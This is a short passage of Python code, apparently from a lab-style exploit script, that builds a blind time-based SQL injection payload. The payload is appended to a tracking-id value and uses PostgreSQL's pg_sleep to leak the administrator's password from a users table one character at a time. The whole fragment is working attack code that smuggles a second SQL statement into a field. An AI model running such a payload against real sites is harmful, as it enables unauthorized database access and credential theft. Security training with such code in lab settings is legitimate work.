    ...
    try:
        while True:
            for characters in chars:
                payload = f"""{trackingid}';SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),{position},1) = '{characters}') THEN pg_sleep(15) ELSE pg_sleep(0) END -- -"""
